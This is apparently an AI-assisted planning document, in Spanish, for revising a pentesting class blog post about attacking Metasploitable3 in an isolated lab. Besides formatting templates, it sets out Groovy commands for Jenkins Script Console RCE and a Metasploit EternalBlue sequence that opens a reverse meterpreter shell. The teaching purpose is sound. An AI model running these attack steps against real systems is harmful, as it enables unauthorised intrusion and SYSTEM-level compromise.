# Phase 1: Revisar tema03 + Plantilla — Pattern Map

**Mapeado:** 2026-05-24
**Archivos analizados:** 4 (1 nuevo principal + 3 auxiliares)
**Analogos encontrados:** 4 / 4

---

## File Classification

| Archivo nuevo / modificado | Rol | Flujo de datos | Análogo más cercano | Calidad de match |
|----------------------------|-----|----------------|---------------------|-----------------|
| `_posts/2026-05-31-tema03.md` | post Jekyll (content) | transform (inserción de secciones sobre base existente) | `_posts/2025-10-05-tema03.md` | exact (es la fuente directa) |
| `_posts/2026-05-31-tema03.md` (front matter) | config/metadata | request-response (build Jekyll) | `_posts/2026-05-10-tema01.md` | role-match (mismo esquema front matter) |
| `_posts/2026-05-31-tema03.md` (secciones nuevas) | content block | transform | `_posts/2026-05-17-tema02.md` | role-match (mismo estilo de sección lab) |
| `.gitignore` | config | — | `.gitignore` existente | exact (añadir una línea) |

---

## Pattern Assignments

### `_posts/2026-05-31-tema03.md` — front matter

**Análogo:** `_posts/2026-05-10-tema01.md` (líneas 1-9) y `_posts/2025-10-05-tema03.md` (líneas 1-8)

**Patrón de front matter a copiar** — combinar lo mejor de ambos análogos:

```yaml
---
title: Clase 03 - Pentesting en un Entorno Controlado usando Metasploitable 3
date: 2026-05-31 12:20:00 -0500
categories: [ciberseguridad, pentesting, laboratorio, metasploit, redes y seguridad]
tags: [MITRE ATT&CK, Metasploitable3, Kali Linux, SSH, EternalBlue, Jenkins, Kill Chain]
math: true
header-includes:
    - \usepackage{pdfpages}
---
```

**Diferencias respecto al análogo base** (`_posts/2025-10-05-tema03.md` líneas 1-8):
- `date`: cambiar `2025-10-05 12:20:00 -0600` → `2026-05-31 12:20:00 -0500` (timezone Lima/Bogotá, consistente con tema01)
- `tags`: ampliar para incluir `EternalBlue, Jenkins` (nuevos kill chains)
- `math: true`: descomentar (estaba comentado en el original con `# header-includes`)
- `header-includes`: descomentar las dos líneas

**Fuente de `math: true`:** `_posts/2026-05-10-tema01.md` línea 6.

---

### `_posts/2026-05-31-tema03.md` — apertura del post

**Análogo:** `_posts/2026-05-10-tema01.md` (línea 11) y `_posts/2026-05-17-tema02.md` (línea 10)

**Patrón de link de grabación** (línea inmediatamente después del front matter):

```markdown
**LINKS DE LA GRABACIÓN DE LA CLASE**: [Clase 03](https://drive.google.com/file/d/1CG0FX22KYBzgg86o21yyHgnTeKb4fJ-x/view)
```

Fuente: `_posts/2025-10-05-tema03.md` línea 10 — preservar intacto (mismo link).

---

### `_posts/2026-05-31-tema03.md` — sección `## Objetivos de Aprendizaje` (NUEVA)

**Posición de inserción:** Antes de `## Resumen del Laboratorio` (actualmente línea 15 en el archivo base).

**Análogo estructural:** No existe análogo exacto en el repo actual. Patrón tomado de RESEARCH.md (Code Examples, líneas 459-475).

**Patrón a usar:**

```markdown
## Objetivos de Aprendizaje

Al finalizar esta sesión, el alumno será capaz de:

1. Ejecutar un reconocimiento de red con Nmap para identificar servicios y vulnerabilidades
   en un entorno controlado.
2. Realizar un ataque de fuerza bruta sobre SSH usando Metasploit y Hydra, y extraer hashes
   de contraseñas de Windows usando Volume Shadow Copy (vssown.vbs).
3. Identificar y explotar una misconfiguration en Jenkins Script Console para obtener
   ejecución remota de código (RCE) sin necesidad de credenciales.
4. Confirmar y explotar la vulnerabilidad EternalBlue/MS17-010 en SMBv1 usando Metasploit
   para obtener acceso con privilegios SYSTEM.
5. Mapear cada etapa del ataque a las tácticas y técnicas correspondientes del framework
   MITRE ATT&CK.
```

---

### `_posts/2026-05-31-tema03.md` — bloque de contenido existente (PRESERVAR INTACTO)

**Fuente:** `_posts/2025-10-05-tema03.md` líneas 13-1211

Secciones a copiar sin modificación:

| Sección | Líneas en fuente |
|---------|-----------------|
| `# Guía de Laboratorio: ...` (H1 título) | 13 |
| `## Resumen del Laboratorio` | 15-20 |
| `## Setup` | 21-28 |
| `## Etapa 1: Reconocimiento` | 29-726 |
| `## Etapa 2: Enumeración de servicios` | 727-768 |
| `## Etapa 3: Acceso Inicial` | 769-863 |
| `## Etapa 4: Explotación y Acceso` | 864-878 |
| `## Paso 5: Extracción de Archivos SAM y SYSTEM usando vssown.vbs` | 879-1211 |

**Anti-pattern crítico:** No renombrar "Paso 5" a "Etapa 5" — la numeración mixta es intencional en el original.

**Patrón de bloque de código en el lab** (extraído de `_posts/2025-10-05-tema03.md` líneas 37-51):

```markdown
```bash
└─$ ip addr show
[output real de la OVA]
```
```

Regla: siempre usar triple backtick con `bash`, `groovy`, o sin especificador según el lenguaje. Nunca comillas tipográficas dentro de bloques de código.

---

### `_posts/2026-05-31-tema03.md` — intro teórica Kill Chain 1: SSH BF (NUEVA, inserción)

**Posición de inserción:** Inmediatamente antes de `## Etapa 1: Reconocimiento` (línea 29 en fuente base). En el nuevo archivo, después del bloque `## Setup`.

**Análogo de estilo:** El patrón de "descripción teórica + referencia MITRE" se observa en `_posts/2025-10-05-tema03.md` líneas 760-768 (sección 2.2 que describe SSH vuln antes del lab).

**Patrón a usar** (de RESEARCH.md Code Examples, líneas 348-363):

```markdown
### Fundamento Técnico: SSH Brute Force

El protocolo SSH (Secure Shell) proporciona acceso remoto cifrado a sistemas. Cuando un
servicio SSH no implementa rate limiting ni bloqueo tras intentos fallidos de autenticación
(como ocurre con OpenSSH 7.1 en su configuración por defecto), un atacante puede automatizar
miles de intentos de login con diferentes combinaciones de usuario/contraseña.

En términos de MITRE ATT&CK, esta técnica corresponde a **T1110.001 — Brute Force: Password
Guessing** bajo la táctica de **Credential Access**. El objetivo del atacante no es explotar
una vulnerabilidad de memoria, sino abusar de un control de acceso débil para obtener
credenciales válidas.
```

**Nota de nivel de encabezado:** Usar `###` (H3) para no romper la jerarquía `##` de las Etapas existentes.

---

### `_posts/2026-05-31-tema03.md` — sección `## Kill Chain 2: Jenkins Script Console RCE` (NUEVA)

**Posición de inserción:** Después de `## Paso 5: ...` (línea 1211 en fuente base, último paso del lab existente), antes de `## Mapeo MITRE ATT&CK`.

**Análogo de estructura:** `_posts/2025-10-05-tema03.md` patrón de etapas numeradas con subapartados `###` y bloques `bash`. El Kill Chain 2 sigue el mismo esquema de: H3 teórico → H3 lab con pasos numerados y bloques de código con output.

**Patrón a usar** (de RESEARCH.md Code Examples, líneas 364-403):

```markdown
## Kill Chain 2: Jenkins Script Console RCE

### Fundamento Técnico: Misconfiguration vs. CVE

Jenkins es una plataforma de integración continua que expone una consola de scripts Groovy
accesible para administradores. En Metasploitable3, esta consola está expuesta en el puerto
8484 **sin autenticación**: cualquier usuario que acceda a la URL puede ejecutar código
arbitrario en el servidor.

Este ataque corresponde a **T1190 — Exploit Public-Facing Application** (Initial Access) y
**T1059 — Command and Scripting Interpreter** (Execution). A diferencia de EternalBlue, no
se explota un CVE — se abusa de una configuración insegura por diseño del entorno de lab.

### Lab: Ejecución de código Groovy

1. Abrir el browser en Kali y navegar a `http://10.0.2.15:8484/jenkins/script`
2. En el campo "Script", escribir:

   ```groovy
   println "cmd /c whoami".execute().text
   ```

3. Hacer clic en **Run**. El output mostrará el usuario bajo el cual corre Jenkins:

   ```
   Result: vagrant-2008r2\administrator
   ```

4. Para ejecutar comandos del sistema operativo más complejos:

   ```groovy
   def cmd = "cmd /c ipconfig"
   def proc = cmd.execute()
   proc.waitFor()
   println proc.text
   ```
```

**Nota para el implementador:** El output `vagrant-2008r2\administrator` es [ASSUMED] — verificar con las OVAs reales antes de publicar (ver Open Question 1 en RESEARCH.md). Si no se puede verificar antes del publish, usar `[usuario-del-servicio-jenkins]` como placeholder con nota al alumno.

---

### `_posts/2026-05-31-tema03.md` — sección `## Kill Chain 3: EternalBlue / MS17-010` (NUEVA)

**Posición de inserción:** Inmediatamente después de Kill Chain 2, antes de `## Mapeo MITRE ATT&CK`.

**Análogo de estructura:** `_posts/2025-10-05-tema03.md` líneas 629-665 (nmap vuln scan ya documentado con output real) — reusar ese output como parte del Kill Chain 3.

**Output real de nmap ya verificado** (de `_posts/2025-10-05-tema03.md` líneas 633-664):

```bash
sudo nmap --script vuln -p80,445 10.0.2.15
# Output relevante:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

**Patrón completo a usar** (de RESEARCH.md Code Examples, líneas 405-456):

```markdown
## Kill Chain 3: EternalBlue / MS17-010

### Fundamento Técnico: Explotación de SMBv1

EternalBlue (CVE-2017-0143) es un exploit que aprovecha una vulnerabilidad en el protocolo
SMBv1 de Windows. Fue desarrollado por la NSA, filtrado por Shadow Brokers en 2017, y
utilizado en los ataques de ransomware WannaCry y NotPetya. En Metasploitable3 (Windows
Server 2008 R2), SMBv1 está habilitado y el sistema no tiene el parche MS17-010 aplicado.

En términos de MITRE ATT&CK: **T1210 — Exploitation of Remote Services** (Lateral Movement/
Initial Access) y **T1068 — Exploitation for Privilege Escalation** dado que el resultado
directo es una shell con privilegios NT AUTHORITY\SYSTEM.

### Lab: Detección y Explotación

**Paso 1: Confirmar la vulnerabilidad**

```bash
sudo nmap --script vuln -p 445 10.0.2.15
```

Output esperado (verificado en las OVAs — ver Etapa 1, escaneo de vulnerabilidades):

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

**Paso 2: Explotar con Metasploit**

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.9
set payload windows/x64/meterpreter/reverse_tcp
run
```

Output esperado al obtener la shell:

```
[*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:XXXXX)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
```

**Nota:** Incluir `set payload windows/x64/meterpreter/reverse_tcp` explícito para evitar fallos por selección automática de payload en arquitectura x64 (ver Open Question 2 en RESEARCH.md).

---

### `_posts/2026-05-31-tema03.md` — sección `## Mapeo MITRE ATT&CK` (NUEVA)

**Posición de inserción:** Después de Kill Chain 3, antes de `## Conclusión y Recomendaciones`.

**Análogo:** No existe tabla MITRE en el repo actual. Esta sección se convierte en STR-01 (plantilla estándar para todos los posts siguientes).

**Patrón de tabla GFM** — Chirpy renderiza tablas Markdown nativas, no se necesita HTML (ver RESEARCH.md Don't Hand-Roll):

```markdown
## Mapeo MITRE ATT&CK

| Etapa | Kill Chain | Táctica | Técnica |
|-------|-----------|---------|---------|
| Reconocimiento de red | SSH BF / Jenkins / EternalBlue | Discovery | T1046 — Network Service Discovery |
| Enumeración de usuarios SSH | SSH BF | Reconnaissance | T1592 — Gather Victim Host Information |
| Fuerza bruta SSH | SSH BF | Credential Access | T1110.001 — Brute Force: Password Guessing |
| Autenticación SSH con credenciales | SSH BF | Initial Access | T1078 — Valid Accounts |
| Extracción SAM/SYSTEM via VSS | SSH BF | Credential Access | T1003.002 — OS Credential Dumping: SAM |
| Crackeo de hashes NT | SSH BF | Credential Access | T1110.002 — Brute Force: Password Cracking |
| Acceso a Script Console sin auth | Jenkins | Initial Access | T1190 — Exploit Public-Facing Application |
| Ejecución de código Groovy | Jenkins | Execution | T1059 — Command and Scripting Interpreter |
| Confirmación de vulnerabilidad SMBv1 | EternalBlue | Discovery | T1046 — Network Service Discovery |
| Explotación SMBv1 remota | EternalBlue | Lateral Movement | T1210 — Exploitation of Remote Services |
| Obtención de shell SYSTEM | EternalBlue | Privilege Escalation | T1068 — Exploitation for Privilege Escalation |
```

**IDs verificados desde attack.mitre.org** — todos los IDs anteriores son HIGH confidence (ver RESEARCH.md Sources).

---

### `_posts/2026-05-31-tema03.md` — sección `## Conclusión y Recomendaciones` (PRESERVAR INTACTO)

**Fuente:** `_posts/2025-10-05-tema03.md` líneas 1212 al final del archivo.

Copiar sin modificación. El texto existente de conclusión es suficiente para esta fase.

---

### `.gitignore` — añadir línea (MODIFICAR)

**Análogo:** `.gitignore` existente (líneas 1-36) — patrón de añadir entradas por categoría con comentario de sección.

**Patrón de la sección existente** (`.gitignore` líneas 29-36):

```
# Claude Code
.claude/
CLAUDE.md
issues/
docs/plan_*.md
docs/methodology_*.md
backups/
todo.md
```

**Línea a añadir** — después de la sección existente o dentro de `# Misc`:

```
# Backups de posts
_posts/*.backup
```

Usar glob `_posts/*.backup` en lugar de la ruta exacta para cubrir futuros backups del mismo tipo.

---

## Shared Patterns

### Patrón de disclaimer legal

**Aplicar a:** Sección `## Setup` del nuevo post (insertar como bloque `>` de advertencia).
**No tiene análogo existente en el repo** — patrón nuevo requerido por CLAUDE.md (técnicas ofensivas solo contra Metasploitable3).

```markdown
> **Aviso Legal:** Las técnicas demostradas en este laboratorio se ejecutan exclusivamente
> contra Metasploitable3 en una red aislada (NAT Network VirtualBox). Su aplicación contra
> sistemas reales sin autorización escrita constituye un delito. Este material es de uso
> exclusivamente educativo.
```

**Fuente del patrón:** RESEARCH.md Security Domain section.

---

### Patrón de bloques de código con output real

**Fuente:** `_posts/2025-10-05-tema03.md` — patrón dominante en todo el archivo.
**Aplicar a:** Todos los nuevos bloques de lab (Kill Chain 2 y 3).

Estructura observada en el análogo (líneas 37-51, 633-664):

```markdown
- Descripción de qué hace el comando.

```bash
comando-real --flags target
output-real-de-la-OVA
línea-2-del-output
```

- Interpretación del output en español.
```

Regla: el output va dentro del mismo bloque `bash`, no en un bloque separado sin especificador de lenguaje. Excepción: cuando el output requiere resaltar que no es bash (ej. Groovy result), usar bloque sin especificador.

---

### Patrón de jerarquía de encabezados

**Fuente:** `_posts/2025-10-05-tema03.md` estructura completa.
**Aplicar a:** Todas las secciones nuevas.

| Nivel | Uso |
|-------|-----|
| `#` | Solo el título principal del laboratorio (línea 13 del fuente) |
| `##` | Secciones principales: Objetivos, Resumen, Setup, Etapas, Kill Chains, MITRE, Conclusión |
| `###` | Subsecciones dentro de cada etapa/kill chain (ej. Fundamento Técnico, Lab) |
| `####` | Sub-subsecciones opcionales |

**Anti-pattern:** No usar `##` para los "Fundamento Técnico" dentro de un Kill Chain — usar `###` para mantener subordinación a la sección `##` del Kill Chain.

---

### Patrón de orden de secciones (STR-01 — plantilla estándar)

**Esta es la estructura canónica** que se replica en todos los posts siguientes según STR-01:

```
[Front matter YAML]
[Link grabación de clase]
# [Título principal del lab]
## Objetivos de Aprendizaje          ← NUEVO en tema03
## Resumen del Laboratorio
## Setup
[### Disclaimer legal]
### Fundamento Técnico: [Kill Chain 1]  ← NUEVO en tema03
## Etapa 1 ... ## Paso 5 [lab existente intacto]
## Kill Chain 2: [nombre]            ← NUEVO en tema03
## Kill Chain 3: [nombre]            ← NUEVO en tema03
## Mapeo MITRE ATT&CK                ← NUEVO en tema03
## Conclusión y Recomendaciones
```

---

## Sin Análogo Encontrado

| Archivo / Sección | Rol | Flujo | Razón |
|-------------------|-----|-------|-------|
| `## Objetivos de Aprendizaje` | content block | — | Ningún post existente tiene esta sección; patrón nuevo |
| `## Mapeo MITRE ATT&CK` (tabla) | content block | — | Primera tabla MITRE del repo; se convierte en STR-01 |
| disclaimer legal (`> Aviso Legal`) | content block | — | No existe ningún bloque de disclaimer en tema01/02 |

Para estas secciones sin análogo, el planner debe usar los patrones documentados en RESEARCH.md Code Examples (líneas 348-594) como fuente de referencia.

---

## Metadata

**Scope de búsqueda de análogos:** `_posts/` (3 archivos leídos), `.gitignore`
**Archivos escaneados:** 4
**Fecha de extracción de patrones:** 2026-05-24
**Líneas de referencia críticas en el análogo base:**
- Front matter: `_posts/2025-10-05-tema03.md` líneas 1-8
- Límite de inserción "Objetivos": antes de línea 15 (`## Resumen del Laboratorio`)
- Output nmap MS17-010 verificado: líneas 629-665 (reusar en Kill Chain 3)
- Límite de inserción Kill Chains 2-3 y MITRE: entre línea 1211 y línea 1212 (`## Conclusión`)
- Conclusión a preservar: línea 1212 hasta EOF
